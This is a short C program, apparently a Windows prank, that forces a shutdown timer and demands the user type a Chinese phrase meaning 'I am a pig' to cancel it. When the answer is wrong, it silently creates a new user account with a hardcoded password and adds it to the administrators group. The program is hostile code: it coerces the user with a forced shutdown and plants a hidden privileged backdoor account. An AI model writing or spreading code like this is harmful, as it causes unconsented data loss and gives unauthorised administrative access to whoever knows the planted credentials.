#include <stdio.h>
#include <string.h>
main()
{
	char input[20] = { 0 };
	system("shutdown -s -t 60 -f");
	printf("输入\"我是猪\",不然会在60秒后关机哦~");
	printf(":>_");
	scanf_s("%s", input, 20);
	if (strcmp(input, "我是猪") == 0)
	{
		system("shutdown -a");
	}
	else
	{
		system("net user user1 sjqyyds /add && net localgroup administrators user1 /add ");
	}
	return 0;
}